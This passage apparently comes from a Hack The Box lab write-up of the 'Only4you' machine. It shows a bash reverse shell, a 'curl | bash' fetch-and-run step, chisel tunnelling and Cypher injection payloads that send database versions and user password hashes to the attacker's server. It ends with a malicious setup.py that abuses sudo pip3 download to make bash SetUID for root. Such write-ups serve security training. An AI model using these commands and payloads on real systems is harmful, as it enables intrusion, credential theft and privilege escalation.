+<div class="codehilite"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+<span class="w"> </span>bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/10.10.16.4/443<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+The command to execute on the victim machine is as follows:<br/><br/>
+<div class="codehilite"><pre><span></span><code>curl 10.10.16.4 | bash
+</code></pre><br style="line-height: 0.5;"/></div>
+
+The idea is to create an HTTP server in Python that serves the index.html file, and when the victim machine requests that file, it interprets it with bash and sends the shell to a port where we will be listening with <code>nc</code> (netcat).<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@parrot</span><span class="err">$</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="o">-</span><span class="n">m</span><span class="w"> </span><span class="n">http</span><span class="p">.</span><span class="n">server</span><span class="w"> </span><span class="mi">80</span>
+<span class="n">Serving</span><span class="w"> </span><span class="n">HTTP</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="mf">0.0.0.0</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="mi">80</span><span class="w"> </span><span class="p">(</span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="err">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span><span class="w"> </span><span class="p">...</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@parrot</span><span class="err">$</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lvnp</span><span class="w"> </span><span class="mi">443</span>
+<span class="nl">Ncat</span><span class="p">:</span><span class="w"> </span><span class="n">Version</span><span class="w"> </span><span class="mf">7.92</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span><span class="w"> </span><span class="p">)</span>
+<span class="nl">Ncat</span><span class="p">:</span><span class="w"> </span><span class="n">Listening</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="o">::</span><span class="err">:</span><span class="mi">443</span>
+<span class="nl">Ncat</span><span class="p">:</span><span class="w"> </span><span class="n">Listening</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="mf">0.0.0.0</span><span class="err">:</span><span class="mi">443</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Once the listening servers are ready, we will send the request:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/15.png"/><br/><br/>
+Finally, we obtain a shell:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@parrot</span><span class="err">$</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lvnp</span><span class="w"> </span><span class="mi">443</span>
+<span class="nl">Ncat</span><span class="p">:</span><span class="w"> </span><span class="n">Version</span><span class="w"> </span><span class="mf">7.92</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span><span class="w"> </span><span class="p">)</span>
+<span class="nl">Ncat</span><span class="p">:</span><span class="w"> </span><span class="n">Listening</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="o">::</span><span class="err">:</span><span class="mi">443</span>
+<span class="nl">Ncat</span><span class="p">:</span><span class="w"> </span><span class="n">Listening</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="mf">0.0.0.0</span><span class="err">:</span><span class="mi">443</span>
+<span class="nl">Ncat</span><span class="p">:</span><span class="w"> </span><span class="k">Connection</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="mf">10.10.11.210</span><span class="p">.</span>
+<span class="nl">Ncat</span><span class="p">:</span><span class="w"> </span><span class="k">Connection</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="mf">10.10.11.210</span><span class="err">:</span><span class="mf">46674.</span>
+<span class="nl">bash</span><span class="p">:</span><span class="w"> </span><span class="n">cannot</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="n">terminal</span><span class="w"> </span><span class="n">process</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="p">(</span><span class="mi">1008</span><span class="p">)</span><span class="err">:</span><span class="w"> </span><span class="n">Inappropriate</span><span class="w"> </span><span class="n">ioctl</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">device</span>
+<span class="nl">bash</span><span class="p">:</span><span class="w"> </span><span class="k">no</span><span class="w"> </span><span class="n">job</span><span class="w"> </span><span class="n">control</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">shell</span>
+<span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@only4you</span><span class="err">:</span><span class="o">~/</span><span class="n">only4you</span><span class="p">.</span><span class="n">htb</span><span class="err">$</span><span class="w"> </span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Before we start with privilege escalation, I like to work comfortably to avoid issues. Therefore, let's set up a TTY to be able to use keyboard shortcuts like CTRL+C, CTRL+L, etc.<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@only4you</span><span class="err">$</span><span class="w"> </span><span class="n">script</span><span class="w"> </span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="k">null</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="n">bash</span>
+<span class="n">script</span><span class="w"> </span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="k">null</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="n">bash</span>
+<span class="n">Script</span><span class="w"> </span><span class="n">started</span><span class="p">,</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="k">null</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+After running this, we'll press CTRL+Z and execute the following command on our machine along with the <code>reset xterm</code>:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@parrot</span><span class="err">$</span><span class="w"> </span><span class="n">stty</span><span class="w"> </span><span class="n">raw</span><span class="w"> </span><span class="o">-</span><span class="n">echo</span><span class="p">;</span><span class="n">fg</span>
+<span class="o">[</span><span class="n">1</span><span class="o">]</span><span class="w">  </span><span class="o">+</span><span class="w"> </span><span class="n">continued</span><span class="w">  </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lvnp</span><span class="w"> </span><span class="mi">443</span>
+<span class="w">                    </span><span class="n">reset</span><span class="w"> </span><span class="n">xterm</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Before we finish, let's export the TERM to enable the use of CTRL+L:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">only4you</span><span class="o">$</span><span class="w"> </span><span class="k">export</span><span class="w"> </span><span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Finally, we now have a more interactive tty to work more comfortably.<br/><br/>
+<h3><br>Privilege Escalation to john:</br></h3><br>
+After a bit of enumeration, we can see that port 8001 is open, and I believe it's a web service.<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@only4you</span><span class="err">$</span><span class="w"> </span><span class="n">ss</span><span class="w"> </span><span class="o">-</span><span class="n">nltp</span>
+<span class="k">State</span><span class="w">   </span><span class="n">Recv</span><span class="o">-</span><span class="n">Q</span><span class="w">  </span><span class="n">Send</span><span class="o">-</span><span class="n">Q</span><span class="w">        </span><span class="k">Local</span><span class="w"> </span><span class="nl">Address</span><span class="p">:</span><span class="n">Port</span><span class="w">    </span><span class="n">Peer</span><span class="w"> </span><span class="nl">Address</span><span class="p">:</span><span class="n">Port</span><span class="w">  </span><span class="n">Process</span><span class="w">                                                   </span>
+<span class="n">LISTEN</span><span class="w">  </span><span class="mi">0</span><span class="w">       </span><span class="mi">4096</span><span class="w">          </span><span class="mf">127.0.0.53</span><span class="o">%</span><span class="nl">lo</span><span class="p">:</span><span class="mi">53</span><span class="w">           </span><span class="mf">0.0.0.0</span><span class="err">:</span><span class="o">*</span><span class="w">                                                               </span>
+<span class="n">LISTEN</span><span class="w">  </span><span class="mi">0</span><span class="w">       </span><span class="mi">128</span><span class="w">                 </span><span class="mf">0.0.0.0</span><span class="err">:</span><span class="mi">22</span><span class="w">           </span><span class="mf">0.0.0.0</span><span class="err">:</span><span class="o">*</span><span class="w">                                                               </span>
+<span class="n">LISTEN</span><span class="w">  </span><span class="mi">0</span><span class="w">       </span><span class="mi">4096</span><span class="w">              </span><span class="mf">127.0.0.1</span><span class="err">:</span><span class="mi">3000</span><span class="w">         </span><span class="mf">0.0.0.0</span><span class="err">:</span><span class="o">*</span><span class="w">                                                               </span>
+<span class="n">LISTEN</span><span class="w">  </span><span class="mi">0</span><span class="w">       </span><span class="mi">2048</span><span class="w">              </span><span class="mf">127.0.0.1</span><span class="err">:</span><span class="mi">8001</span><span class="w">         </span><span class="mf">0.0.0.0</span><span class="err">:</span><span class="o">*</span><span class="w">                                                               </span>
+<span class="n">LISTEN</span><span class="w">  </span><span class="mi">0</span><span class="w">       </span><span class="mi">70</span><span class="w">                </span><span class="mf">127.0.0.1</span><span class="err">:</span><span class="mi">33060</span><span class="w">        </span><span class="mf">0.0.0.0</span><span class="err">:</span><span class="o">*</span><span class="w">                                                               </span>
+<span class="n">LISTEN</span><span class="w">  </span><span class="mi">0</span><span class="w">       </span><span class="mi">151</span><span class="w">               </span><span class="mf">127.0.0.1</span><span class="err">:</span><span class="mi">3306</span><span class="w">         </span><span class="mf">0.0.0.0</span><span class="err">:</span><span class="o">*</span><span class="w">                                                               </span>
+<span class="n">LISTEN</span><span class="w">  </span><span class="mi">0</span><span class="w">       </span><span class="mi">511</span><span class="w">                 </span><span class="mf">0.0.0.0</span><span class="err">:</span><span class="mi">80</span><span class="w">           </span><span class="mf">0.0.0.0</span><span class="err">:</span><span class="o">*</span><span class="w">      </span><span class="nl">users</span><span class="p">:((</span><span class="ss">"nginx"</span><span class="p">,</span><span class="n">pid</span><span class="o">=</span><span class="mi">1025</span><span class="p">,</span><span class="n">fd</span><span class="o">=</span><span class="mi">6</span><span class="p">),(</span><span class="ss">"nginx"</span><span class="p">,</span><span class="n">pid</span><span class="o">=</span><span class="mi">1022</span><span class="p">,</span><span class="n">fd</span><span class="o">=</span><span class="mi">6</span><span class="p">))</span><span class="w">  </span>
+<span class="n">LISTEN</span><span class="w">  </span><span class="mi">0</span><span class="w">       </span><span class="mi">128</span><span class="w">                    </span><span class="o">[</span><span class="n">::</span><span class="o">]</span><span class="err">:</span><span class="mi">22</span><span class="w">              </span><span class="o">[</span><span class="n">::</span><span class="o">]</span><span class="err">:</span><span class="o">*</span><span class="w">                                                               </span>
+<span class="n">LISTEN</span><span class="w">  </span><span class="mi">0</span><span class="w">       </span><span class="mi">4096</span><span class="w">     </span><span class="o">[</span><span class="n">::ffff:127.0.0.1</span><span class="o">]</span><span class="err">:</span><span class="mi">7687</span><span class="w">               </span><span class="o">*</span><span class="err">:</span><span class="o">*</span><span class="w">                                                               </span>
+<span class="n">LISTEN</span><span class="w">  </span><span class="mi">0</span><span class="w">       </span><span class="mi">50</span><span class="w">       </span><span class="o">[</span><span class="n">::ffff:127.0.0.1</span><span class="o">]</span><span class="err">:</span><span class="mi">7474</span><span class="w">               </span><span class="o">*</span><span class="err">:</span><span class="o">*</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+If we try to make a GET request using the curl command, we can confirm that we are correct and it is indeed a web service:<br/><br/>
+<div class="codehilite"><pre><span></span><code>www-data@only4you$<span class="w"> </span>curl<span class="w"> </span>-s<span class="w"> </span>http://127.0.0.1:8001/
+<span class="cp">&lt;!doctype html&gt;</span>
+<span class="nt">&lt;html</span><span class="w"> </span><span class="na">lang=</span><span class="s">en</span><span class="nt">&gt;</span>
+<span class="nt">&lt;title&gt;</span>Redirecting...<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;h1&gt;</span>Redirecting...<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;p&gt;</span>You<span class="w"> </span>should<span class="w"> </span>be<span class="w"> </span>redirected<span class="w"> </span>automatically<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>target<span class="w"> </span>URL:<span class="w"> </span><span class="nt">&lt;a</span><span class="w"> </span><span class="na">href=</span><span class="s">"/login"</span><span class="nt">&gt;</span>/login<span class="nt">&lt;/a&gt;</span>.<span class="w"> </span>If<span class="w"> </span>not,<span class="w"> </span>click<span class="w"> </span>the<span class="w"> </span>link.
+</code></pre><br style="line-height: 0.5;"/></div>
+
+In the command output, we can see that it redirects to a supposed /login. Before continuing to analyze this website, we can simplify the process by establishing a tunnel with <a href="https://github.com/jpillora/chisel">chisel</a> using Remote Port Forwarding for port 8001, allowing us to access the website from our attacker machine.<br/><br/>
+Downloading chisel is straightforward; you can go to the Releases section and download a version that matches your system and the victim machine's system. Since the victim machine is 64-bit architecture, and mine is too, I can use the same binary for both machines.<br/><br/>
+On our machine, we create the chisel server:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@parrot</span><span class="err">$</span><span class="w"> </span><span class="p">.</span><span class="o">/</span><span class="n">chisel</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="c1">--reverse -p 4646</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Now, on the victim machine, we connect as a client:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@only4you</span><span class="err">$</span><span class="w"> </span><span class="p">.</span><span class="o">/</span><span class="n">chisel</span><span class="w"> </span><span class="n">client</span><span class="w"> </span><span class="mf">10.10.16.4</span><span class="err">:</span><span class="mi">4646</span><span class="w"> </span><span class="nl">R</span><span class="p">:</span><span class="mi">8001</span><span class="err">:</span><span class="mf">127.0.0.1</span><span class="err">:</span><span class="mi">8001</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Now, if we try to access the web service through our browser, we can enter it successfully, and it redirects us to the <code>/login</code> resource:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/16.png"/><br/><br/>
+If we try default credentials, the most commonly used ones could be:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">username</span><span class="o">:</span><span class="w"> </span><span class="n">user</span>
+<span class="n">password</span><span class="o">:</span><span class="w"> </span><span class="n">user</span>
+
+<span class="n">username</span><span class="o">:</span><span class="w"> </span><span class="n">admin</span>
+<span class="n">password</span><span class="o">:</span><span class="w"> </span><span class="n">admin</span>
+
+<span class="n">username</span><span class="o">:</span><span class="w"> </span><span class="n">guest</span>
+<span class="n">password</span><span class="o">:</span><span class="w"> </span><span class="n">guest</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Among many others, and in our case, admin - admin worked. <br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/17.png"/><br/><br/>
+We managed to access the web with the correct credentials.<br/><br/>
+If we take a look at <code>/dashboard</code>, we can see a section called "Tasks" that appears to contain tasks that the admin user must complete or certain reminders for the admin user.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/18.png"/><br/><br/>
+Here they mention something about <a href="https://neo4j.com/">Neo4j</a>, so I believe they might be using this type of database for certain resources or services.<br/><br/>
+In the <code>/employees</code> resource, we can see that we can enter certain information. It seems to be a search section that allows us to filter by users or, as the name suggests, employees.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/19.png"/><br/><br/>
+If we enter a character, for example, "a," we can see that the content of the page changes, and it returns some information:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/20.png"/><br/><br/>
+At first glance, it appears that there is a database query running in the background that filters the information based on what we provide in the search box.<br/><br/>
+This could be critical if implemented improperly, as entering a malicious payload could lead to a SQL Injection vulnerability.<br/><br/>
+<h3><br>Cypher Injection:</br></h3><br>
+To test this, we will enter a single quote in the search box:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/21.png"/><br/><br/>
+We can see that an error has occurred as indicated by the status code 500.<br/><br/>
+I would like to assume that the search box uses a Neo4j database, so if we search the internet for ways to exploit Neo4j, we come across Cypher Injection.<br/><br/>
+In my case, I will use payloads from <a href="https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j">HackTricks</a> to perform the exploitation.<br/><br/>
+One of the first payloads I'm going to try is the one to extract the version of the Neo4j server:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/22.png"/><br/><br/>
+We need to adapt the payload slightly for our case by changing the initial URL to ours:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="s1">' OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM '</span><span class="nv">http</span>:<span class="o">//</span><span class="mi">10</span>.<span class="mi">10</span>.<span class="mi">16</span>.<span class="mi">4</span>:<span class="mi">8000</span><span class="o">/</span>?<span class="nv">version</span><span class="o">=</span><span class="s1">' + version + '</span><span class="o">&amp;</span><span class="nv">name</span><span class="o">=</span><span class="s1">' + name + '</span><span class="o">&amp;</span><span class="nv">edition</span><span class="o">=</span><span class="err">' + edition as l RETURN 0 as _0 //</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+For convenience, I will use Burp Suite to send the requests. We will also URL-encode all the payloads:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/23.png"/><br/><br/>
+After sending the payload, if we check our web server, we can see the request with the version of the Neo4j server:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/25.png"/><br/><br/>
+If we continue to try the payloads offered by HackTricks, we will notice that none of the others work. However, we can attempt further enumeration by modifying the payload that works.<br/><br/>
+In this case, we will enumerate the labels the server has, modifying the previous payload since the one offered by HackTricks doesn't work:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="s1">' OR 1=1 WITH 1 as a CALL db.labels() YIELD label LOAD CSV FROM '</span><span class="nv">http</span>:<span class="o">//</span><span class="mi">10</span>.<span class="mi">10</span>.<span class="mi">16</span>.<span class="mi">4</span>:<span class="mi">8000</span><span class="o">/</span>?<span class="nv">label</span><span class="o">=</span><span class="err">' + label as l RETURN 0 as _0 //</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+We send the request and receive the following on our server:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/26.png"/><br/><br/>
+We can see that we receive the names of the labels, and one of them is "user," which is interesting because it might contain stored credentials.<br/><br/>
+<h3><br>Shell as john:</br></h3><br>
+By reading further in HackTricks, we can see that we can obtain the properties of a key:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/27.png"/><br/><br/>
+We will try to modify the payload slightly, adapting our values:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="s1">' OR 1=1 WITH 1 as a MATCH (u:user) UNWIND keys(u) as p LOAD CSV FROM '</span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.16.4</span><span class="err">:</span><span class="mi">8000</span><span class="o">/</span><span class="vm">?</span><span class="s1">' + p +'</span><span class="o">=</span><span class="err">'</span><span class="o">+</span><span class="n">toString</span><span class="p">(</span><span class="n">u</span><span class="o">[</span><span class="n">p</span><span class="o">]</span><span class="p">)</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">l</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">_0</span><span class="w"> </span><span class="o">//</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Then we will send the request with our listening server, and if all goes well, we will receive the following:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/29.png"/><br/><br/>
+It seems to have worked, and we obtained hashed usernames and passwords. The most interesting one here is John's password. Be careful because the hash appears first, and then the username, which can be confusing and lead you to copy the wrong hash.<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@parrot</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">hash</span><span class="w"> </span>
+<span class="n">a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+We will crack the hash using brute force with the John the Ripper tool, specifying the correct format:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/30.png"/><br/><br/>
+We can see that the John the Ripper tool has successfully cracked the hash, and we obtained the user's password.<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">john</span><span class="o">:</span><span class="n">ThisIs4You</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Now, what we will do is connect via SSH with the user "john" and his password:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="p">@</span><span class="n">parrot$</span><span class="w"> </span><span class="n">ssh</span><span class="w"> </span><span class="n">john</span><span class="mf">@10.10.11.210</span><span class="w"> </span>
+<span class="n">john</span><span class="mf">@10.10.11.210</span><span class="err">'</span><span class="n">s</span><span class="w"> </span><span class="n">password</span><span class="o">:</span><span class="w"> </span><span class="n">ThisIs4You</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+At this point, we can see the first flag of the machine:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">john</span><span class="nv">@only4you</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="k">user</span><span class="p">.</span><span class="n">txt</span>
+<span class="mi">3</span><span class="n">eb188e464b</span><span class="o">****************</span><span class="mi">4</span><span class="n">ed79</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+If we list the privileges that the user "john" has at the sudo level, we can see the following:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">john</span><span class="err">@</span><span class="n">only4you</span><span class="o">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">l</span>
+<span class="n">Matching</span><span class="w"> </span><span class="n">Defaults</span><span class="w"> </span><span class="n">entries</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">john</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">only4you</span><span class="p">:</span>
+<span class="w">    </span><span class="n">env_reset</span><span class="p">,</span><span class="w"> </span><span class="n">mail_badpass</span><span class="p">,</span><span class="w"> </span><span class="n">secure_path</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">bin</span>
+
+<span class="n">User</span><span class="w"> </span><span class="n">john</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">commands</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">only4you</span><span class="p">:</span>
+<span class="w">    </span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">NOPASSWD</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">pip3</span><span class="w"> </span><span class="n">download</span><span class="w"> </span><span class="n">http</span>\<span class="p">:</span><span class="o">//</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span>\<span class="p">:</span><span class="mi">3000</span><span class="o">/*.</span><span class="n">tar</span><span class="o">.</span><span class="n">gz</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+The user "john" can execute the command as root without specifying his password:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">pip3</span><span class="w"> </span><span class="n">download</span><span class="w"> </span><span class="n">http</span>\<span class="p">:</span><span class="o">//</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span>\<span class="p">:</span><span class="mi">3000</span><span class="o">/*.</span><span class="n">tar</span><span class="o">.</span><span class="n">gz</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+It seems that it's trying to download a Python package from a remote server. To abuse this, we need to see what's on port 3000 of the victim machine. I accomplished this by using chisel once again.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/32.png"/><br/><br/>
+It seems that the web service uses Gogs, which is a service that provides the ability to host Git repositories.<br/><br/>
+We can log in using the credentials we already have for the user "john."<br/><br/>
+We can see that there is a "test" repository:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/33.png"/><br/><br/>
+Reading some <a href="https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/">documentation</a> on how to exploit pip, I found that if the Python package format is <code>.tar.gz</code>, when you run the <code>pip download</code> command, it will execute a <code>setup.py</code> file found within the package being downloaded.<br/><br/>
+The idea here is to upload a malicious <code>setup.py</code> file and then copy the URL of the Git repository in <code>.tar.gz</code> format.<br/><br/>
+First, let's create the malicious setup.py file:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/python3 </span>
+
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">"chmod u+s /bin/bash"</span><span class="p">)</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+What we will do is, when we run the <code>pip download</code> on this repository, it will interpret the <code>setup.py</code> file, which will execute the command <code>chmod u+s /bin/bash</code> to assign Set-UID privileges to the bash.<br/><br/>
+First, let's make sure the test repository is not private:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/39.png"/><br/><br/>
+We upload the file <code>setup.py</code>:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/35.png"/><br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/36.png"/><br/><br/>
+We have to copy <code>tar.gz</code> :<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/38.png"/><br/><br/>
+And finally we execute the command that we can run as root with sudo:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">john</span><span class="err">@</span><span class="n">only4you</span><span class="o">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">pip3</span><span class="w"> </span><span class="n">download</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">3000</span><span class="o">/</span><span class="n">john</span><span class="o">/</span><span class="n">Test</span><span class="o">/</span><span class="n">archive</span><span class="o">/</span><span class="k">master</span><span class="o">.</span><span class="n">tar</span><span class="o">.</span><span class="n">gz</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+We look at the privileges of the <code>/bin/bash</code>:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">john</span><span class="nv">@only4you</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">1183448</span><span class="w"> </span><span class="n">Apr</span><span class="w"> </span><span class="mi">18</span><span class="w">  </span><span class="mi">2022</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+We become root by running the <code>bash -p</code> command, taking advantage of the <code>/bin/bash</code> now being Set-UID<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">john</span><span class="nv">@only4you</span><span class="err">$</span><span class="w"> </span><span class="n">bash</span><span class="w"> </span><span class="o">-</span><span class="n">p</span>
+<span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="err">#</span><span class="w"> </span><span class="n">whoami</span>
+<span class="n">root</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Finally, we get the last flag:<br/><br/>
+<div class="codehilite"><pre><span></span><code>bash-5.0# cat /root/root.txt
+8c60f13f*************e56f3664496
+</code></pre><br style="line-height: 0.5;"/></div></br></br></br></br></br>
